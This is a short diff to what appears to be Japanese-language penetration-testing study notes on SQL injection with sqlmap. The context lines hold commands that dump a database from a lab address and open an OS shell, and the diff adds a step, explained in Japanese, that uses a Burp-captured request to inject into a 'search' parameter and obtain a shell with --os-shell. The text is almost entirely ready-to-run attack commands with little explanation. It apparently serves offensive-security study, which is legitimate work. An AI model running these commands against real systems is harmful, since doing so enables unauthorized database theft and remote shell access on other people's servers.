@@ -33,3 +33,7 @@ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
 sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 ```
 
+3. Burpから取得しておいたget.txtのリクエストを-rで引数指定。searchパラメータに対する値をインジェクションのポイントにする。--os-shellでシェルを獲得する。  
+```
+sqlmap -r get.txt -p search --os-shell
+```
